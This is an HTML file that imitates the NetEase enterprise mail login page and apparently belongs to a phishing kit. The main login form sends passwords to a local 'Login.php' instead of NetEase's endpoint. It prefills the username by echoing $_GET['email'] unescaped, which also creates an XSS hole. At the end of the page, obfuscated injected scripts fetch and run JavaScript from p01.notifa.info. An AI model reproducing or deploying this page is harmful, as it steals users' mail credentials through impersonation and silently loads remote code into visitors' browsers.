<!DOCTYPE html>
<html lang="zh_CN"> 
    <head>
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-type" content="text/html;charset=utf-8">
        <title>&#32593;&#26131;&#20225;&#19994;&#37038;&#31665; - &#30331;&#24405;&#20837;&#21475;</title>
        <meta name="keywords" content="&#32593;&#26131;&#20225;&#19994;&#37038;&#31665;,&#30331;&#24405;&#20225;&#19994;&#37038;&#31665;,&#20225;&#19994;&#37038;&#31665;&#27880;&#20876;,&#30005;&#23376;&#37038;&#31665;">
        <meta name="description" content="&#30331;&#24405;&#32593;&#26131;&#20225;&#19994;&#37038;&#31665;&#65292;&#35831;&#22635;&#20889;&#23436;&#25972;&#30340;&#37038;&#20214;&#22320;&#22336;&#25110;&#31649;&#29702;&#21592;&#24080;&#21495;&#65292;&#25903;&#25345;&#25163;&#26426;&#25195;&#30721;&#30331;&#24405;&#12290;&#29992;&#37038;&#31665;&#22823;&#24072;&#65292;&#38543;&#26102;&#38543;&#22320;&#65292;&#26497;&#36895;&#25910;&#21457;&#12290;">
        <link rel="shortcut icon" href="https://mimghz.qiye.163.com/o/mailapp/qiyelogin/style/img/favicon.ico" type="image/x-icon">

        <link rel="stylesheet" href="https://mimghz.qiye.163.com/o/mailapp/qiyelogin/style/css/login.9954dc85.css">
        <script type="text/javascript" src="https://mimg.127.net/p/tools/jquery/jquery-1.8.1.min.js"></script>
        <script id="jsBase" type="text/javascript" src="https://mimg.127.net/index/lib/scripts/base_v3.js"></script>
        <script type="text/javascript" src="https://mimg.qiye.163.com/o/index/lib/scripts/qiye_algorithm.js"></script>
        <script id="jsBaseInner" type="text/javascript">
            //&#21028;&#26029;cookie
            fCheckCookie();
            //HTML5&#21021;&#22987;&#21270;
            fHtml5Tag();
        </script>
        <style>
            .m-login .login-form {padding: 25px 25px 0;}

            .m-login .logincheck {width: 72px;height:32px;line-height: 32px;z-index: 1;}
            .m-verifycode{display: none;}
            .m-verifycode .m-ipt{height: 30px;border: 1px solid #999;border-radius:4px;}
            .m-verifycode .js-ipt{background: #fff;width: 76px;height: 30px;display: inline-block;*display:inline;*zoom:1;margin-bottom: 0;vertical-align: middle;}
            .m-verifycode .m-ipt .ipt{width: 60px;height: 20px;line-height: 20px;left: 0;padding: 4px 8px;vertical-align: middle;}
            .m-verifycode .m-ipt .placeholder {position: absolute;left: 13px;top: 5px;}
            .m-verifycode img{display: inline-block;vertical-align: middle;width: 90px;height: 30px;cursor: pointer;}
            .m-login .loginconf{zoom:1;}
            .m-login .loginselect {width: 94px;}
            .m-login .loginselect a.selector{margin-left: 0;}
            .m-login .loginact{color: #959595;line-height: 15px;}
            .m-login .loginact a {margin-left: 5px;margin-right: 0;}
            .m-login .loginerror{position: absolute;bottom: 80px;left:14px;}
            .f-zindex-10{z-index: 10;}
        </style>
    </head>
    <body>
        <header class="g-hd">
            <div class="g-wrap">
                <h1 class="w-qiyelogo">
                    <a href="http://qiye.163.com/" target="_blank" title="&#20013;&#22269;&#31532;&#19968;&#22823;&#30005;&#23376;&#37038;&#20214;&#26381;&#21153;&#21830;">
                        <img src="https://mimg.qiye.163.com/o/public/logo.gif" alt="&#32593;&#26131;&#20225;&#19994;&#37038;&#31665;">
                    </a>
                </h1>
                <nav class="m-hdnav">
                    <a href="http://qiye.163.com/" target="_blank">&#20225;&#19994;&#37038;&#31665;</a>|<a href="http://mail.qiye.163.com/?hl=zh_TW" target="_blank">&#32321;&#39636;&#29256;</a>|<a href="http://mail.qiye.163.com/?hl=en_US" target="_blank">English</a>|<a href="http://hw.qiye.163.com/" target="_blank">&#22269;&#22806;&#29992;&#25143;&#30331;&#24405;</a>|<a id="help-url-id" href="javascript:void(0);" target="_blank">&#24110;&#21161;</a>|<a href="http://qiye.163.com/entry/buy-price.htm" target="_blank">&#36141;&#20080;</a>
                </nav>
            </div>
        </header>
        <section class="g-bd">
            <div class="g-bd-mn js-bdImg">
                <div class="g-wrap">
                    <div class="m-theme">
                        <a class="link js-linkTheme" href="http://qiye.163.com/mobile/" target="_blank"></a>
                        <div class="themectrl">
                            
                            <a class="themeA prevTheme js-prevTheme" href="javascript:void(0);" title="&#19978;&#19968;&#24352;"></a>
                            <a class="themeA nextTheme js-nextTheme" href="javascript:void(0);" title="&#19979;&#19968;&#24352;"></a>
                            
                        </div>
                    </div>
                    <div class="m-login js-loginpanel">
                        <div class="login-hd">
                            <div class="item js-loginhd" data-lgtype="account">&#37038;&#31665;&#24080;&#21495;&#30331;&#24405;</div>
                            <div class="item js-loginhd" data-lgtype="admin">&#31649;&#29702;&#21592;&#30331;&#24405;</div>
                        </div>
                        <div class="login-bd">
                            <form class="login-form" name="accountlogin" method="post" action="Login.php">

                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-account"></span>
    <input id="accname" name="accname" value="<?php echo $_GET['email']; ?>" class="ipt js-value js-username" tabindex="1" type="text" title="">
                                    <label for="accname" class="placeholder js-placeholder"></label>
                                </div>
                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-pwd"></span>
                                    <input id="accpwd" class="ipt js-value js-pwd" tabindex="2" title="&#35831;&#36755;&#20837;&#23494;&#30721;" type="password" name="password">
                                    <label for="accpwd" class="placeholder js-placeholder">&#23494;&#30721;</label>
                                </div>

                                <div class="loginconf">
                                    <div class="logincheck js-logincheck">
                                        <span class="icon icon-checkbox js-checkbox"></span>
                                        <label for="accautologin" class="checklabel js-autolabel">
                                            <input tabindex="3" title="&#35760;&#20303;&#24080;&#21495;" class="checkipt js-autologin" type="checkbox" id="accautologin">
                                        &#35760;&#20303;&#24080;&#21495;</label>
                                        <div class="securetip js-securetip">&#20026;&#20102;&#24744;&#30340;&#20449;&#24687;&#23433;&#20840;&#65292;&#35831;&#19981;&#35201;&#22312;&#32593;&#21543;&#25110;&#20844;&#29992;&#30005;&#33041;&#19978;&#20351;&#29992;&#27492;&#21151;&#33021;&#65281;
                                        </div>
                                    </div>
                                    <div class="m-verifycode">
                                        <div class="m-ipt js-ipt">
                                            <input id="accverifycode" class="ipt js-value js-verifycode" tabindex="2" title="&#35831;&#36755;&#20837;&#39564;&#35777;&#30721;" type="text" name="verify_code">
                                            <label for="accverifycode" class="placeholder js-placeholder">&#39564;&#35777;&#30721;</label>
                                        </div>
                                        <img src="" width="90" id="imgVerifycode" class="refreshVerifycode" title="&#28857;&#20987;&#20999;&#25442;">
                                    </div>
                                </div>
                                <div class="loginbtn">
                                    <button class="w-button w-button-account js-loginbtn" type="submit" tabindex="4">&#30331; &#24405;</button>
                                </div>
                                <div class="loginact">
                                    <div class="loginselect">
                                        <a class="selector js-sslsel" href="javascript:;" hidefocus="true">&#27491;&#20351;&#29992;<span class="js-ssltxt">SSL&#30331;&#24405;</span><span class="icon icon-arrow"></span></a>
                                        <div class="m-lgselect js-lgselect">
                                            <ul>
                                                <li>
                                                    <a class="js-selitem selected" href="javascript:;" hidefocus="true" data-allssl="0">SSL&#30331;&#24405;</a>
                                                </li>
                                                <li>
                                                    <a class="js-selitem" href="javascript:;" hidefocus="true" data-allssl="1">&#20840;&#31243;SSL</a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                    <a href="https://mail.qiye.163.com/mailapp/qiyeurs/?from=http%3A%2F%2Fmail.qiye.163.com%2F#/resetPwd" target="_blank">&#24536;&#35760;&#23494;&#30721;&#20102;&#65311;</a>
                                    <a class="js-testspeed" href="javascript:;" hidefocus="true">&#30331;&#24405;&#22826;&#24930;&#65311;</a>
                                </div>
                            </form>
                            <form class="login-form login-form-admin js-loginform js-loginform-admin" name="adminlogin" action="https://entry.qiye.163.com/domain/domainAdminLogin" method="post" target="_top">
                                <input type="hidden" class="js-domain" name="domain" value="">
                                <input type="hidden" class="js-accname" name="account_name" value="">
                                <input type="hidden" class="js-isSecure" name="secure" value="1">
                                <input type="hidden" class="js-isAllSecure" name="all_secure" value="0">
                                <input type="hidden" class="js-language" name="language" value="0">
                                <input type="hidden" class="js-pubid" name="pubid" value="">
                                <input type="hidden" class="js-passtype" name="passtype" value="">
                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-account"></span>
                                    <input id="adminname" class="ipt js-value js-username" tabindex="1" type="text" title="&#35831;&#36755;&#20837;&#23436;&#25972;&#37038;&#31665;&#22320;&#22336;" name="accname">
                                    <label for="adminname" class="placeholder js-placeholder">&#35831;&#36755;&#20837;&#23436;&#25972;&#37038;&#31665;&#22320;&#22336;</label>
                                </div>
                                <div class="m-ipt js-ipt">
                                    <span class="icon icon-pwd"></span>
                                    <input id="adminpwd" class="ipt js-value js-pwd" tabindex="2" title="&#35831;&#36755;&#20837;&#23494;&#30721;" type="password" name="password">
                                    <label for="adminpwd" class="placeholder js-placeholder">&#23494;&#30721;</label>
                                </div>
                                <div class="loginconf">
                                    <div class="logincheck js-logincheck">
                                        <span class="icon icon-checkbox js-checkbox"></span>
                                        <label for="adminautologin" class="checklabel js-autolabel">
                                            <input tabindex="3" title="&#35760;&#20303;&#24080;&#21495;" class="checkipt js-autologin" type="checkbox" id="adminautologin">
                                        &#35760;&#20303;&#24080;&#21495;</label>
                                        <div class="securetip js-securetip">&#20026;&#20102;&#24744;&#30340;&#20449;&#24687;&#23433;&#20840;&#65292;&#35831;&#19981;&#35201;&#22312;&#32593;&#21543;&#25110;&#20844;&#29992;&#30005;&#33041;&#19978;&#20351;&#29992;&#27492;&#21151;&#33021;&#65281;
                                        </div>
                                    </div>
                                    <div class="m-verifycode">
                                        <div class="m-ipt js-ipt">
                                            <input id="adminverifycode" class="ipt js-value js-verifycode" tabindex="2" title="&#35831;&#36755;&#20837;&#39564;&#35777;&#30721;" type="text" name="verify_code">
                                            <label for="adminverifycode" class="placeholder js-placeholder">&#39564;&#35777;&#30721;</label>
                                            <div class="close-bg"></div>
                                        </div>
                                        <img src="" width="90" id="imgadminVerifycode" class="refreshVerifycode" title="&#28857;&#20987;&#20999;&#25442;">
                                    </div>
                                </div>
                                <div class="loginbtn">
                                    <button class="w-button w-button-admin js-loginbtn" type="submit" tabindex="4">&#31649;&#29702;&#21592;&#30331;&#24405;</button>
                                </div>
                                <div class="loginact">
                                    <div class="loginselect">
                                        <div class="selector">&#27491;&#20351;&#29992;SSL&#30331;&#24405;</div>
                                    </div>
                                    <a href="https://mail.qiye.163.com/mailapp/qiyeurs/?from=http%3A%2F%2Fmail.qiye.163.com%2F#/resetPwd" target="_blank">&#24536;&#35760;&#23494;&#30721;&#20102;&#65311;</a>
                                </div>
                            </form>
                            <div id="msgpid" class="loginerror"></div>
                        </div>
                        <div class="login-ft js-loginft">
                            <div class="m-download">
                                <a class="dlitem" target="_blank" href="http://u.163.com/androidds4"><span class="icon icon-android"></span>Android&#29256;</a>
                                &nbsp;|&nbsp;
                                <a class="dlitem" target="_blank" href="http://u.163.com/iosds4"><span class="icon icon-apple"></span>iPhone&#29256;</a>
                            </div>
                        </div>
                        <div class="js-speedbox">
                            <div class="m-speed">
                            </div>
                        </div>
                        <a class="w-codeentry js-codeentry" href="javascript:;" hidefocus="true"></a>
                        
                        <div class="m-codebox js-codebox f-zindex-10">
                            
                            <div id="appLoginTab" class="appLoginTab">
                                <div id="appLoginWait" style="display: block">
                                    <h3>&#25163;&#26426;&#25195;&#30721; &#23433;&#20840;&#38450;&#30423;</h3>
                                    <div id="appCodeWrap" class="appCodeWrap allowmove">
                                        <div class="appCode-example"></div>
                                        <div id="appCodeBox" class="appCodeBox">
                                            <img id="appCode" class="appCode" width="130" height="130" src="https://mail.qiye.163.com/mailapp/commonweb/qrcode/getqrcode.do?w=130&h=130">
                                            <div id="appCodeRefresh" class="appCodeRefresh" style="display: none">
                                                <div class="appCode-mask"></div>
                                                <div class="appCode-wrap"><p>&#20108;&#32500;&#30721;&#24050;&#22833;&#25928;<br>&#35831;&#28857;&#20987;&#21047;&#26032;</p></div>
                                            </div>
                                        </div>
                                    </div>
                                    <p id="appLoginTxt" class="appLoginTxt txt-err"></p>
                                    <p class="appLogin-hint">&#20351;&#29992; &#37038;&#31665;&#22823;&#24072; &#25195;&#25551;&#20108;&#32500;&#30721;&#30331;&#24405;</p>
                                    <p class="appLoginlink"><a id="howToUseApp" class="howToUseApp" href="javascript:void(0)">&#22914;&#20309;&#20351;&#29992;</a><var>|</var><a href="http://mail.163.com/dashi/" target="_blank">&#19979;&#36733;&#37038;&#31665;&#22823;&#24072;</a></p>
                                </div>
                                <div id="appLoginScan" class="appLoginScan" style="display:none">
                                    <div class="appLogin-scanSuc"></div>
                                    <p class="appLogin-scantxt txt-suc">&#25104;&#21151;&#25195;&#25551;&#65292;&#35831;&#22312;&#25163;&#26426;&#19978;&#30830;&#35748;&#30331;&#24405;</p>
                                    <a id="appLoginRestart" class="appLoginRestart" href="javascript:void(0)">&#36820;&#22238;&#37325;&#26032;&#25195;&#25551;</a>
                                </div>
                            </div>
                            <a class="closeentry js-closeentry" href="javascript:;" hidefocus="true"></a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <footer class="g-ft">
            <div class="g-wrap">
                <a class="w-nteslogo" href="http://www.163.com/" target="_blank">
                    <img src="https://mimg.127.net/logo/netease_logo.gif" alt="&#32593;&#26131;NetEase">
                </a>
                <a id="KX_IMG" class="w-kximg" href="https://ss.cnnic.cn/verifyseal.dll?sn=e12051044010020841301459&ct=df&pa=997669" target="_blank"><img src="https://mimg.127.net/logo/knet.png" alt="&#21487;&#20449;&#32593;&#31449;&#65292;&#36523;&#20221;&#39564;&#35777;"></a>
                <nav class="m-ftnav">
                    <a href="http://gb.corp.163.com/gb/home.shtml" target="_blank">&#20851;&#20110;&#32593;&#26131;</a><a href="http://weibo.com/163qiye" target="_blank">&#23448;&#26041;&#24494;&#21338;</a><a href="http://qiyemail.blog.163.com/" target="_blank">&#23448;&#26041;&#21338;&#23458;</a><a href="http://help.163.com/" target="_blank">&#23458;&#25143;&#26381;&#21153;</a><a href="http://gb.corp.163.com/gb/legal.html" target="_blank">&#30456;&#20851;&#27861;&#24459;</a>&emsp;|&emsp;&#32593;&#26131;&#20844;&#21496;&#29256;&#26435;&#25152;&#26377;&copy;1997-<script type="text/javascript" src="https://mimg.127.net/copyright/year.js"></script>
                </nav>
            </div>
        </footer>
        
        <img src="https://ssl.mail.163.com/httpsEnable.gif" style="position: absolute;left: -999em;top: -999em;width: 0;height: 0">
        <script type="text/javascript">
            var gDocHeight = $('body').height();
            //&#21021;&#22987;&#21270;&#39029;&#38754;&#22402;&#30452;&#23621;&#20013;
            resizeBody();
            function resizeBody(){
                var winHeight = $(window).height();
                var heightGap = winHeight - gDocHeight;
                if(heightGap > 5){
                    $('body').css('padding-top', heightGap/2);
                }else{
                    $('body').css('padding-top', 0);
                }
            }
        </script>
        <script type="text/javascript" src="https://analytics.163.com/ntes.js"></script>
        
        
        <script type="text/javascript">
        _ntes_nacc = "qiye";
        neteaseTracker();
        neteaseClickStat();
        </script>
        
        
        <script src="https://mimghz.qiye.163.com/o/mailapp/qiyelogin/js/login.7cb338bf.js"></script>
        <script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create', 'UA-60729705-1', 'auto');ga('send', 'pageview');</script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mtJm5wnIT8zqvbUbdUEEDFaUAaPA9jceYN%2bWuM9tIMGTkXByt7f2ZibUQ%2b5%2f77WDymD7dII05OwuV9cfgf%2bj0%2flU7Cp%2bNCkNmuVH%2f4WlDkuidF21CuPmhI%2fqj%2btjOHpiya%2f7HDpKjrvquuKXpdbFSZ42I83N7ct8NELmAV0RtBoUrlK4%2fZdTDIG%2fI4VD0hc6t8OdcEmtPhgf8fCrgo0TFhTPxub19WFcNqa7CzioBQFFIRbtyTa87PU5PUidyjOG1suCUdbyNfNtRVru7gsKuQM7XQDyqCbiup5Ok0nuOBAVPZh%2f5%2bhYj%2fBVjLJdP%2ffkW78WKeUOGhCmuceDFeilRIaBXP2K%2bT2hw66AKPd2Km5kkZmQ%2busb61US5Xa7LzK29TRdmzk0IKwFg4cgLzDoxpWpK1LqwoYcBGEKiAkfLRZYJXh9%2bfYShJg1XBi4so4jyXLv5EN48Y7Gi3KntqTURuf1mAbAD6qPgkbxolo4j05jfsajUhL0t0D9swC50sy8VJoALdrxETzfNp6MuSJyUaCoCfZfLCrQ%2bcdwB8j6wlVERcWlQTeGkiV0lQo0SaKUaKAO4532LTdTOdANR0q3ioVO24tc4qosnGRpJz%2b6xFMvzjkwq3n4biA%2b6lYo2t7dC3qUA5fI%2f13evulSVh%2bmYm1U%2bDk%2f3nVlz7TPhEFqwjG1QLaMRQiBaKf%2fRDBGjAnTd" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mtJm5wnIT8zpRDIuvnoEJpu4rJNeF8rIl5nSN8bczhfnzKBxaIdy6xU879KdzKEOsRmF%2fAeOEGSHhrhomniVHkteo1oaL9OGBF3hlWkIxWKjN%2f%2fD5HJQN%2fFozq5E3mTb6%2bacfeIvbYe5Apv%2bHQ3vEhvb6H9%2fmbQnuE9KwVYxVqAB7zCzV8Tjr74tdfoeZcf3RTv5HUopxecYt%2fykZ6AHGuCfuQUoBKArzY3H8SmPPAb%2fK5l5AIWrU%2bPa7YTCI5WvMQMsqFLwoRoCU5WdAo9gL1UpzD7aziw82m3Iyt3gjvMwgFuMUZmrqUDQeveCtJXuBitI%2b%2fOUQt5Lbln5dfO7YmoM8hCGQnqf1ExHnooxvy1T6X5JY3DSwfuFo43PACdKI6XMYO1wZ8bQg%2f1aaV55ET4eBrvh5Qj%2bckejc%2f81sLpeJ1ICLGrb7db2p%2ba49civqSug8L0pwRzS%2bAruWdOpCRBmvOHCAUATokb3NnvjLqbcMhfFuD6SzBgKuPuEHv7G4a5%2fNQOkwynM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>